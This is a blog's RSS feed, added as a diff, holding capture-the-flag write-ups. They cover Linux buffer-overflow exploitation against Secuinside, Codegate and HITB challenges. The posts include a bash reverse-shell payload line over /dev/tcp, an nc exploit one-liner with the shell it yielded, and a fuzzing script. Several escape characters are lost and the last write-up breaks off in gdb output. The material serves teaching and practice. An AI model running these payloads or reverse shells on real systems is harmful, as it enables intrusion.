@@ -1,0 +1,771 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<channel>
+   
+   	<title>RealJenius.com - Tag: CTF - CLGT Crew</title>
+   
+   <link>http://realjenius.com</link>
+   <description>I'm a software developer in the game industry, and have been (for better or worse) coding on the Java platform for the last decade. I also do all my own stunts.</description>
+   <language>en-us</language>
+   <managingEditor>R.J. Lorimer</managingEditor>
+   <atom:link href="rss" rel="self" type="application/rss+xml" />
+   
+	<item>
+  <title>[Secuinside CTF 2013] pwnme writeup</title>
+  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2013/05/28/secuinside-ctf-2013-pwnme-writeup.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2013-05-28T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2013/05/28/secuinside-ctf-2013-pwnme-writeup.html</guid>
+  <description><![CDATA[
+     <p>Challenge summary:</p>
+
+<p>Binary : http://war.secuinside.com/files/pwnme<br />
+Source : http://war.secuinside.com/files/pwnme.c<br />
+===================================<br />
+OS : Ubuntu 13.04 with PIE+ASLR+NX<br />
+md5 of libc-2.17.so : 45be45152ad28841ddabc5c875f8e6e4</p>
+
+<p>IP : 54.214.248.68<br />
+PORT : 8181,8282,8383</p>
+
+<p>This is the only exploit challenge comes with source. The bug is simple: buffer overflow with only 16-bytes at <em>pwnme.c:67</em>, just enough to control EIP. The goal is to bypass PIE+ASLR+NX. We first thought about information leak by overwriting one byte of saved EIP and looking for status. Unfortunately, this way soon becomes an dead end as socket was closed before returning at <em>pwnme.c:72</em>, so no more input, output can be provided to the program. Conclusion: we have to bruteforce for useful addresses, and due to binary is PIE bruteforcing for libc address the best way for code reuse. Luckily, ASLR on Ubuntu x86 is weak, the libc base address looks like 0xb7NNN000 with only 12-bits randomization. Server daemon will fork a child process for every coming connection, that means addresses will be the same for all instances and bruteforcing 12-bits only take 4096 tries at max. If server is fast, stable this can be done in few minutes, but in fact CTF game server was out of service for most of the time :).</p>
+
+<p>Now we can assume that libc is at fixed address, let build the payload. But where is my input buffer? It was zeroing out at <em>pwnme.c:71</em>, there must be something hidden. Let take a look at crash by sending a 1040 bytes pattern buffer:</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0
+EBX: 0xb774b000 --&gt; 0x1aed9c
+ECX: 0x0
+EDX: 0xb774b000 --&gt; 0x1aed9c
+ESI: 0x0
+EDI: 0x0
+EBP: 0x41397441 ('At9A')
+ESP: 0xbfac6ce0 --&gt; 0x1
+EIP: 0x75417375 ('usAu')
+EFLAGS: 0x10217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x75417375
+[------------------------------------stack-------------------------------------]
+0000| 0xbfac6ce0 --&gt; 0x1
+0004| 0xbfac6ce4 --&gt; 0xbfac6d74 --&gt; 0xbfac78db ("./pwnme")
+0008| 0xbfac6ce8 --&gt; 0xbfac6d7c --&gt; 0xbfac78e3 ("TERM=xterm")
+0012| 0xbfac6cec --&gt; 0xb777a000 --&gt; 0x20f38
+0016| 0xbfac6cf0 --&gt; 0x20 (' ')
+0020| 0xbfac6cf4 --&gt; 0x0
+0024| 0xbfac6cf8 --&gt; 0xb77566f0 --&gt; 0xb759c000 --&gt; 0x464c457f
+0028| 0xbfac6cfc --&gt; 0x3
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x75417375 in ?? ()
+gdb-peda$ patts
+Registers contain pattern buffer:
+EIP+0 found at offset: 1036
+EBP+0 found at offset: 1032
+No register points to pattern buffer
+Pattern buffer found at:
+0xb7753000 : offset 1016 - size   24 (mapped)
+0xb7753023 : offset   27 - size  989 (mapped)
+0xbfac6cd0 : offset 1024 - size   16 ($sp + -0x10 [-4 dwords])
+References to pattern buffer found at:
+0xb774ba24 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xb774ba28 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xb774ba2c : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xb774ba30 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xb774ba34 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xb774ba38 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xb774ba3c : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xbfac6210 : 0xb7753000 ($sp + -0xad0 [-692 dwords])
+0xbfac6224 : 0xb7753000 ($sp + -0xabc [-687 dwords])
+0xbfac6248 : 0xb7753000 ($sp + -0xa98 [-678 dwords])
+0xbfac6254 : 0xb7753000 ($sp + -0xa8c [-675 dwords])
+0xbfac6294 : 0xb7753000 ($sp + -0xa4c [-659 dwords])
+0xbfac67c8 : 0xb7753000 ($sp + -0x518 [-326 dwords])
+0xbfac67d4 : 0xb7753000 ($sp + -0x50c [-323 dwords])
+0xbfac6814 : 0xb7753000 ($sp + -0x4cc [-307 dwords])
+gdb-peda$
+</pre>
+
+<p>Our input buffer is still there in non-stack memory starts at 0xb7753000, actually this is “stdout” buffer used in <em>printf()</em> at <em>pwnme.c:70</em>.</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">gdb-peda$ info symbol 0xb7753000
+No symbol matches 0xb7753000.
+gdb-peda$ info symbol 0xb774ba24
+_IO_2_1_stdout_ + 4 in section .data of /lib/i386-linux-gnu/tls/i686/nosegneg/libc.so.6
+</pre>
+
+<p>We can only assume that libc is fixed, if above buffer address is randomized things will become worse (means finding tedious ROP gadgets to pivot). Fortunately, that buffer is at fixed offset related to libc address.</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">gdb-peda$ vmmap libc
+Start      End        Perm    Name
+0xb759c000 0xb7749000 r-xp    /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
+0xb7749000 0xb774b000 r--p    /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
+0xb774b000 0xb774c000 rw-p    /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
+gdb-peda$ distance 0xb759c000 0xb7753000
+From 0xb759c000 to 0xb7753000: 1798144 bytes, 449536 dwords
+</pre>
+
+<p>Try to run the program several times to check and the offset is unchanged. We can build the payload now, the simplest one is calling <em>system()</em> with bash reverse shell, or you can try harder with full ROP payload (like what we did during the contest and wasted few more hours :)).</p>
+
+<p>Sample payload will look like:</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">base = 0xb7500000 + bruteforce_value
+target = base + 1798144 + 0x304 # make enough space for fake stack
+cmd_ptr = target + some_offset # calculate it yourself
+cmd = "bash -c 'exec &gt;/dev/tcp/127.127.127.127/4444 0&lt;&amp;1';"
+payload = [ret ... ret, system, exit, cmd_ptr, cmd, padding] # total size = 1032
+payload += [target] # will become EBP
+payload += [leave_ret] # stack pivoting
+</pre>
+
+<p>Run it hundred of times and wait for a shell coming to your box.</p>
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>Codegate 2010 online CTF &#8211; Challenge 4 &amp; 5 writeup</title>
+  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/16/codegate-2010-online-ctf-challenge-4-5-writeup.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2010-03-16T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/16/codegate-2010-online-ctf-challenge-4-5-writeup.html</guid>
+  <description><![CDATA[
+     <h1 id="summary">Summary</h1>
+
+<p>Challenge 4 has a basic buffer overflow vulnerability running on modern Ubuntu Linux with ASLR. Challenge 5 shares the same code as Challenge 4 but added NX protection to make it harder. In challenge 4 we use ret2eax to by pass ASLR and return-to-libc technique to bypass NX in challenge 5 with brute-forcing for execl() libc address. We had to access to the server (hijack account of Challenge #2) to search for execl() address, it’s weakness of our solution for challenge 5.</p>
+
+<h1 id="analysis">Analysis</h1>
+
+<p>Challenge 4 information:</p>
+
+<blockquote>
+  <p>credentials: ctf4.codegate.org 9000<br />
+BINARY FILE:  http://ctf.codegate.org/files____/easy</p>
+</blockquote>
+
+<p>Challenge 5 information:</p>
+
+<blockquote>
+  <p>credentials: ctf4.codegate.org 9001<br />
+BINARY FILE:  http://ctf.codegate.org/files____/harder</p>
+</blockquote>
+
+<p>Both “easy” and  “harder” share the same code which looks like below:</p>
+
+<pre class="brush: cpp; highlight: [17]; title: ; notranslate" title="">int __cdecl main()
+{
+ size_t n; // [sp+18h] [bp-8h]@1
+ char *lineptr; // [sp+1Ch] [bp-4h]@1
+
+ lineptr = 0;
+ printf("Input: ");
+ fflush(0);
+ getline(&amp;lineptr, &amp;n, stdin);
+ func(lineptr, n);
+ return puts("nThanks. Goodbye");
+}
+
+void *__cdecl func(const void *src, size_t n)
+{
+ char dest[264]; // [sp+10h] [bp-108h]@1
+ return memcpy(dest, src, n);
+}
+</pre>
+
+<p>The traditional BOF at memcpy() in func() with 272 bytes allows us to overwrite the saved EIP to control program execution. Exploit for “easy” is obvious, you can find a writeup <a href="http://coma.0x3f.net/uncategorized/codegate2010-ctf-level-4/" target="_blank">here</a>, remain of this post will talk about Challenge 5.</p>
+
+<p>The problem for exploiting ‘harder’ is to bypass:</p>
+
+<ul>
+  <li>ASLR</li>
+  <li>NX protection</li>
+</ul>
+
+<p>We will use return-to-libc technique to overcome that.</p>
+
+<h1 id="solutionexploit">Solution/Exploit</h1>
+
+<p>In order to exploit the “harder” we have to:</p>
+
+<ul>
+  <li>Locate address of execl() function in libc</li>
+  <li>Locate address of “/bin/sh” somewhere in memory</li>
+  <li>Arrange stack to call execl(“/bin/sh”, …) when return from func()</li>
+</ul>
+
+<h2 id="locate-address-of-execl">Locate address of execl()</h2>
+
+<p>Based on our experience in Padocon 2010 pre-qual, we know that random mmap library address will repeat after several run.</p>
+
+<pre>$ gdb harder
+(gdb) start
+Temporary breakpoint 1, 0x0804850e in main ()
+(gdb) p execl
+$1 = {&lt;text variable, no debug info&gt;} 0x1a70c0 &lt;execl&gt;
+(gdb) quit</pre>
+
+<h2 id="locate-address-of-8220binsh8221">Locate address of “/bin/sh”</h2>
+
+<p>There’s several way to find “/bin/sh” pointer according to other contestants discussed in #codegate IRC:</p>
+
+<ul>
+  <li>Find “/bin/sh” address in RO_DATA of libc</li>
+  <li>Put “/bin/sh” in our input buffer then find stack address that points to it (address of “dest” in func())</li>
+  <li>Put “/bin/sh” in our input buffer then re-use “*lineptr” (already point to our buffer) remain in stack. This is our method.</li>
+</ul>
+
+<p>Let examine the stack when we’re in func():</p>
+
+<pre>(gdb) disass func
+Dump of assembler code for function func:
+0x080484e4 &lt;func+0&gt;:    push   ebp
+0x080484e5 &lt;func+1&gt;:    mov    ebp,esp
+0x080484e7 &lt;func+3&gt;:    sub    esp,0x118
+0x080484ed &lt;func+9&gt;:    mov    eax,DWORD PTR [ebp+0xc]      &lt;-- n
+0x080484f0 &lt;func+12&gt;:   mov    DWORD PTR [esp+0x8],eax
+0x080484f4 &lt;func+16&gt;:   mov    eax,DWORD PTR [ebp+0x8]      &lt;-- src's address (*lineptr)
+0x080484f7 &lt;func+19&gt;:   mov    DWORD PTR [esp+0x4],eax
+0x080484fb &lt;func+23&gt;:   lea    eax,[ebp-0x108]              &lt;-- dest's address
+0x08048501 &lt;func+29&gt;:   mov    DWORD PTR [esp],eax
+0x08048504 &lt;func+32&gt;:   call   0x80483f8 &lt;memcpy@plt&gt;
+0x08048509 &lt;func+37&gt;:   leave
+0x0804850a &lt;func+38&gt;:   ret
+End of assembler dump.
+
+(gdb) b *0x08048504
+Breakpoint 1 at 0x8048504
+(gdb) r
+Starting program: /tmp/harder
+Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 1, 0x08048504 in func ()
+(gdb) x/20x $ebp
+0xbffff738:     0xbffff768      0x08048568      0x0804b008      0x00000078
+                                                [*lineptr] (2)
+0xbffff748:     0x00d5b420      0xbffff768      0x00c49345      0x006c2d20
+0xbffff758:     0x00000078      0x0804b008      0x08048590      0x00000000
+                                [*lineptr] (1)  [garbage str]
+0xbffff768:     0xbffff7e8      0x00c30b56      0x00000001      0xbffff814
+0xbffff778:     0xbffff81c      0xb7fff858      0xbffff7d0      0xffffffff
+
+(gdb) x/8x 0x0804b008
+0x804b008:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804b018:      0x41414141      0x41414141      0x41414141      0x41414141</pre>
+
+<p>Address of *lineptr is <strong>0x0804b008</strong> which point to our buffer. There’s two instances of *lineptr address on stack: (1) returned from getline(), (2) placed before calling func(). The (2) address is useless because it’s next to ret, the (1) address with next 2 addresses <strong>0×08048590</strong>, <strong>0×00000000</strong> is perfect for execl(). What we need to do is lift the esp to correct address with few ret.</p>
+
+<h2 id="arrange-buffer--stack">Arrange buffer &amp; stack</h2>
+
+<p>With all the things above, we can craft our buffer as below:</p>
+
+<pre>["/bin/sh" | padding | ret*6 | execl() | "n"]</pre>
+
+<p>This will result on stack when return from func():</p>
+
+<pre>[ret*6 | execl() | 0xdeadbeef | "/bin/sh" | "garbage string" | 0 ]</pre>
+
+<h2 id="exploit">Exploit</h2>
+
+<pre>while true; do
+ (python -c 'print "/bin/shx00" + "A"*260 + "x75x85x04x08"*6 + "xc0x70x1ax00" + "n"'; cat) | nc ctf4.codegate.org 9001
+done
+Input:
+Input:
+Input:
+
+id
+uid=1004(harder) gid=1004(harder)
+cat /home/harder/flag.txt
+e2e4cb6adc9cd761dcde774f84529591  -</pre>
+
+<h1 id="references">References</h1>
+
+<ul>
+  <li><a href="http://neworder.box.sk/newsread.php?newsid=13007" target="_blank">http://neworder.box.sk/newsread.php?newsid=13007</a></li>
+  <li><a href="http://0xbeefc0de.org/papers/fc3_bof.txt" target="_blank">http://0xbeefc0de.org/papers/fc3_bof.txt</a></li>
+</ul>
+
+<p>Keywords: return-to-libc, aslr, esp lifting, codegate 2010</p>
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>HITB Daemon1 Solution</title>
+  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/01/20/hitb-daemon1-solution.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2010-01-20T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/01/20/hitb-daemon1-solution.html</guid>
+  <description><![CDATA[
+     <p>Here is my next solution for HITB CTF 2009 Daemon1. Similar to <a href="http://www.vnsecurity.net/2009/12/hitb-2009-daemon6-write-up/">daemon 6</a>, the flag is the content of errorcode.txt file located in the same directory with daemon’s binary.</p>
+
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">home suto # netstat -tulpan
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN   6174/daemon1
+</pre>
+
+<p>So you can see it listens on port 4444. Next I tried to find where the daemon processes my input.</p>
+
+<pre class="brush: python; highlight: [13,24]; title: ; notranslate" title="">.text:080494F1                 push    eax
+.text:080494F2                 call    _recv
+.text:080494F7                 add     esp, 10h
+.text:080494FA                 cmp     eax, 0
+.text:080494FD                 jle     loc_80495D2
+.text:08049503                 push    esi
+.text:08049504                 push    eax
+.text:08049505                 lea     esi, [ebp-538h]
+.text:0804950B                 push    esi
+.text:0804950C                 mov     ecx, [ebp-548h]
+.text:08049512                 push    ecx
+.text:08049513                 call    sub_804A2B0
+.text:08049518                 mov     eax, offset aIcvykbmukcrwdp ; &quot;iCvYkBMuKcrwDPkAqmCFgOKVeV34&quot;
+.text:0804951D                 mov     ecx, 1Ch
+.text:08049522                 cld
+.text:08049523                 mov     esi, [ebp-560h]
+.text:08049529                 mov     edi, eax
+.text:0804952B                 repe cmpsb
+.text:0804952D                 setnbe  dl
+.text:08049530                 setb    al
+.text:08049533                 add     esp, 10h
+.text:08049536                 cmp     dl, al
+.text:08049538                 jnz     loc_80495FF
+.text:0804953E                 call    sub_8048F10
+.text:08049543                 push    0
+.text:08049545                 sub     esp, 8
+.text:08049548                 push    offset s
+.text:0804954D                 call    _strlen
+.text:08049552                 add     esp, 0Ch
+.text:08049555                 push    eax
+.text:08049556                 push    offset s
+.text:0804955B
+.text:0804955B loc_804955B:                            ; CODE XREF: .text:08049608j
+.text:0804955B                 mov     edx, [ebp-548h]
+.text:08049561                 push    edx
+.text:08049562                 call    _send
+
+</pre>
+
+<p>And here is what sub_8048F10 does:</p>
+
+<pre class="brush: python; title: ; notranslate" title="">lea     edi, [ebp+var_40]
+mov     esi, offset unk_80553D2
+mov     ecx, edx
+rep movsd
+mov     ax, ds:word_80553EA
+mov     [edi], ax
+push    (offset aSocketError+0Bh) ; modes
+push    offset filename ; &quot;/home/d1/errorcode.txt&quot;
+call    _fopen
+&lt;snip&gt;
+</pre>
+
+<p>The code compares “<strong>iCvYkBMuKcrwDPkAqmCFgOKVeV34</strong>” with the input string. If it’s matched, the encrypted content of errorcode.txt will be returned.</p>
+
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">home suto #nc localhost 4444
+
+iCvYkBMuKcrwDPkAqmCFgOKVeV34
+
+ddddddddddPfddddfdssqpfdddddddddhfh
+</pre>
+
+<p>“ddddddddddPfddddfdssqpfdddddddddhfh” is the return data. It’s the encrypted content of errorcode.txt (which is “1″ in this case).</p>
+
+<p>After few hours trying to reverse the binary, I got stuck with the encoding algorithm so I tried to analysis the output data instead.</p>
+
+<p>Input: 1<br />
+Ouput: ddddddddddPfddddfdssqpfdddddddddhfh</p>
+
+<p>Input: 2<br />
+Output: ddddddddddPfdddddfdssqpfhfh</p>
+
+<p>Input: 3<br />
+Output: ddddddddddPfdddddfdssqpfdhfh</p>
+
+<p>Input: 4<br />
+Output: ddddddddddPfdddddfdssqpfddhfh</p>
+
+<p>==&gt;Output string begins with ddddddddddPfdddddfdssqpf and ends with hfh, number 1 is the special case.</p>
+
+<p>9<br />
+ddddddddddPfdddddfdssqpfdddddddhfh</p>
+
+<p>Next, we test with 2 numbers:</p>
+
+<p>24<br />
+<span style="color: #ff0000">ddddddddddPfdddddfdssqpfhddhfh</span></p>
+
+<p>3 numbers:</p>
+
+<p>247<br />
+<span style="color: #ff0000">ddddddddddPfdddddfdssqpfhdd</span><span style="color: #00FF00">hddd</span>hfh</p>
+
+<p>We can see that the string with red color is the same as the output for 24, and the green part is addition part for 7, so I guess h is character to begin a new number, let’s see with 6 numbers:</p>
+
+<p>247398<br />
+ddddddddddPfdddddfdssqpf<strong>h</strong>dd<strong>h</strong>ddd<strong>h</strong>qqqq<strong>h</strong>dddddd<strong>h</strong>qhfh</p>
+
+<p>Now the algorithm is more clear :), the length of input number is the number of ‘h’ in the encoded data + 1 (we don’t count the last ‘hfh’). But how about q and d?</p>
+
+<p>From 247398:<br />
+ddddddddddPfdddddfdssqpf<span style="color: #ff0000">hdd</span><span style="color: #00ff00">hddd</span><span style="color: #ff0000">hqqqq</span><span style="color: #00ff00">hdddddd</span><span style="color: #ff0000">hq</span>hfh<br />
+4 is hdd<br />
+7 is hddd<br />
+3 is hqqqq<br />
+9 is hdddddd<br />
+8 is hq</p>
+
+<p>Yeah! when the next number is increased, it uses a d for +1 (7 = 4 + 3 = hddd).<br />
+q is used for decrease (-1).</p>
+
+<p>35896742<br />
+ddddddddddPfdddddfdssqp<span style="text-decoration: underline"> <span style="color: #ff0000"><strong>fd[<span style="color: #333300">3</span>]</strong></span></span><span style="color: #ff0000"><strong> </strong></span> <strong><span style="color: #ff0000">hdd</span></strong>[5] <span style="color: #ff0000"><strong>hddd</strong></span>[8] <strong><span style="color: #ff0000">hd[<span style="color: #333300">9</span>]</span></strong> <strong><span style="color: #ff0000">hqqq[<span style="color: #333300">6</span>]</span></strong> <strong><span style="color: #ff0000">hd[<span style="color: #333300">7</span>]</span></strong> <strong><span style="color: #ff0000">hqqq[<span style="color: #333300">4</span>]</span><span style="color: #ff0000"> hqq[<span style="color: #333300">2</span>]</span></strong>hfh</p>
+
+<p>Why 3? You answer yourself !</p>
+
+<p>Now we come back to special cases for number 1 and 0</p>
+
+<p>358967421<br />
+ddddddddddPfdddddfd<span style="color: #ff0000"><strong>d</strong><strong>ddfds</strong></span>ssqpfdhddhdddhdhqqqhdhqqqhqq<span style="color: #ff0000"><strong>h</strong><strong>fddddddddd</strong></span>hfh</p>
+
+<p>Here is output for 35896742<br />
+ddddddddddPfdddddfdssqpfdhddhdddhdhqqqhdhqqqhqqhfh</p>
+
+<p>The different parts are marked with Red color.</p>
+
+<p>Put 1 in the middle:<br />
+3589617421<br />
+ddddddddddPfdddddfd<span style="color: #ff0000"><strong>d</strong><strong>ddfds</strong></span>ssqpfdhddhdddhdhqqq<strong><span style="color: #ff0000">hfddddddddd</span><span style="color: #00ff00">hsd</span></strong>hqqqhqq<strong><span style="color: #ff0000">hf</span></strong>hfh</p>
+
+<p>358967421<br />
+ddddddddddPfdddddfd<span style="color: #ff0000"><strong>dddfds</strong></span>ssqpfdhddhdddhdhqqqhdhqqqhqq<strong><span style="color: #ff0000">hfddddddddd</span></strong>hfh</p>
+
+<p>35896742</p>
+
+<p>ddddddddddPfdddddfdssqpfdhddhdddhdhqqqhdhqqqhqqhfh</p>
+
+<p>So the output will be fdddddddddh for number 1. If 1 is in the middle, it will be dddfds.<br />
+And another notes is hsd , one “d” character because it is calculated from the number before “1″ – 6- and increases it to -7-.</p>
+
+<p>Another test:</p>
+
+<p>4668981445134<br />
+ddddddddddPfdddddf<span style="color: #ff0000"><strong>d</strong><strong>dddfds</strong></span>ssqpfdd<span style="color: #ff0000">(<strong>4)</strong></span>hdd<strong><span style="color: #ff0000">(6)</span></strong>h<strong><span style="color: #ff0000">(6)</span></strong>hdd<strong><span style="color: #ff0000">(8)</span></strong>hd<span style="color: #ff0000"><strong>(9)</strong></span>hq<strong><span style="color: #ff0000">(8)</span></strong>hfddddddddd<strong><span style="color: #ff0000">(1)</span></strong>hsqqqq<strong><span style="color: #ff0000">(4)</span></strong>h<span style="color: #ff0000">(4)</span></p>
+
+<p>hd<span style="color: #ff0000"><strong>(5) </strong></span>hf<strong><span style="color: #ff0000">(1</span></strong>)hs qq<strong><span style="color: #ff0000">(3)</span></strong> hd<strong><span style="color:#ff0000">(4)</span></strong> hffh</p>
+
+<p>Now replace the number 1 with 0 from previous input:</p>
+
+<p>ddddddddddPfdddddfd<span style="color: #ff0000"><strong>dddfds</strong></span>ssqpfdd<span style="color: #0000ff"><strong>(4)</strong></span>hdd<strong><span style="color: #0000ff">(6)</span></strong>h<strong><span style="color: #0000ff">(6)</span></strong>hdd<span style="color: #0000ff"><strong>(8)</strong></span>hd<strong><span style="color: #0000ff">(9)</span></strong>hq<strong><span style="color: #0000ff">(8)</span><span style="color: #ff0000">hfdddddddd</span><span style="color: #0000ff">(0)</span></strong>hsqqqq<strong><span style="color: #0000ff">(4)</span></strong>h<strong><span style="color: #0000ff">(4)</span></strong>hd<span style="color: #0000ff"><strong>(5)</strong></span></p>
+
+<p>hf<span style="color: #0000ff"><strong>(0)</strong></span>hsqq<strong><span style="color: #0000ff">(3) </span></strong>hd<span style="color: #0000ff"><strong>(4)</strong></span>hffh</p>
+
+<p>We see 0 is quite similar to 1 with one ‘d’ less.</p>
+
+<p>Now it’s just a simple task to decode the return content of errorcode.txt (flag) from the daemon.</p>
+
+<p>And it’s all about daemon1 in HITB CTF 2009!</p>
+
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>HITB 2009 CTF Daemon6&#039;s Solution</title>
+  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2009/12/08/hitb-2009-daemon6-write-up.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2009-12-08T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2009/12/08/hitb-2009-daemon6-write-up.html</guid>
+  <description><![CDATA[
+     <p>This is the solution for daemon 06 of HITB 2009 CTF game. Note that I didn’t participate <a href="/about-us/clgt-ctf-team/">CLGT team</a> at HITB 2009 CTF this year. I just played with the binaries after the conference to learn and practice myself.</p>
+
+<p>For a short summary, daemon 06 is a SNMP Daemon listening on port 7272 with a basic buffer overflow bug in the SNMP packet handling function.</p>
+
+<pre>[snmpd v2.1] SNMP Daemon Started
+
+Attempting to listen on port 7272..Ready</pre>
+
+<p>I started learning and reading some <a href="http://www.rane.com/note161.html" target="_blank">papers</a> about SNMP protocol. Basically, SNMP packet follow basic encoding rules. The most fundamental rule states that each field is encoded in three parts: Type, Length, and Data.</p>
+
+<ul>
+  <li>Type specifies the data type of the field using a single byte identifier.</li>
+  <li>Length specifies the length in bytes of the following Data section</li>
+  <li>Data is the actual value communicated.</li>
+</ul>
+
+<p>Next, I build a packet with a very large content and send to this daemon to check out for trivial overflow bug.</p>
+
+<p>Type: 0×30 because it is a sequence of bytes<br />
+Length: 0xff ( to make largest packet as i can )<br />
+Data: I use a special string generate by Metasploit.</p>
+
+<p>Here is script:</p>
+
+<pre class="brush: python; title: ; notranslate" title="">#!/usr/bin/python
+from socket import *
+import struct
+
+host = "localhost"
+port = 7272
+
+shellcode="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A"
+
+payload = "x30xff"+shellcode
+sock = socket(AF_INET,SOCK_DGRAM)
+sock.sendto(payload,(host,port))
+sock.close()
+</pre>
+
+<p>After launching this script, I saw daemon6 got segfault.</p>
+
+<pre>Program received signal SIGSEGV, Segmentation fault.
+
+[Switching to Thread 0xb7e726c0 (LWP 23375)]
+
+0x62413862 in ?? ()
+
+(gdb)</pre>
+
+<p>So I change this string “b8Ab” in script to AAAA to re-check. And:</p>
+
+<pre>Program received signal SIGSEGV, Segmentation fault.
+
+[Switching to Thread 0xb7e726c0 (LWP 23385)]
+
+0x41414141 in ?? ()</pre>
+
+<p>Now I can control execution flow of program and now is the time to find out what caused of this vuln. Launch IDA and search for all occurences of Recv</p>
+
+<p><img src="http://img40.imageshack.us/img40/7356/screenshot6uh.png" alt="recv" /></p>
+
+<p>Follow recvfrom function</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">.text:0804D610                 call    _recvfrom
+.text:0804D615                 add     esp, 20h
+.text:0804D618                 test    eax, eax
+.text:0804D61A                 js      recvfromerror
+.text:0804D620
+.text:0804D620 loc_804D620:                            ; CODE XREF: .text:0804D870j
+.text:0804D620                 push    ecx
+.text:0804D621                 push    0FCh
+.text:0804D626                 push    0
+.text:0804D628                 push    ebx
+.text:0804D629                 call    _memset
+.text:0804D62E                 pop     eax
+.text:0804D62F                 pop     edx
+.text:0804D630                 push    ebx
+.text:0804D631                 lea     eax, [ebp-0CB0h]
+.text:0804D637                 push    eax
+.text:0804D638                 call    sub_804CC90
+</pre>
+
+<p>Now I use GDB to check if function at 0x0804cc90 is vulnerable.</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">(gdb) b *0x0804D637
+Breakpoint 1 at 0x804d637
+(gdb) r
+Starting program: /home/d6/daemon6
+(no debugging symbols found)
+(no debugging symbols found)
+(no debugging symbols found)
+[Thread debugging using libthread_db enabled]
+(no debugging symbols found)
+[snmpd v2.1] SNMP Daemon Started
+Attempting to listen on port 7272..Ready
+[New Thread 0xb7dd26c0 (LWP 13501)]
+[New Thread 0xb7d63b90 (LWP 13504)]
+[Switching to Thread 0xb7dd26c0 (LWP 13501)]
+
+Breakpoint 1, 0x0804d637 in ?? ()
+(gdb) x/4i $eip
+0x804d637 &lt;difftime@plt+17679&gt;:	push   %eax
+0x804d638 &lt;difftime@plt+17680&gt;:	call   0x804cc90 &lt;difftime@plt+15208&gt;
+0x804d63d &lt;difftime@plt+17685&gt;:	add    $0x10,%esp
+0x804d640 &lt;difftime@plt+17688&gt;:	mov    0x805c1b0,%eax
+(gdb) b *0x804d63d
+Breakpoint 2 at 0x804d63d
+(gdb) c
+Continuing.
+incorrect request
+
+Program received signal SIGSEGV, Segmentation fault.
+0x62413862 in ?? ()
+</pre>
+
+<p>Check arguments of this function:</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">(gdb) x/2x $esp
+0xbfb43980:    0xbfb43998    0xbfb44278
+(gdb) x/x 0xbfb43998
+0xbfb43998:    0x6141ff30
+(gdb) x/s 0xbfb43998
+0xbfb43998:     "0�Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5"...
+(gdb)
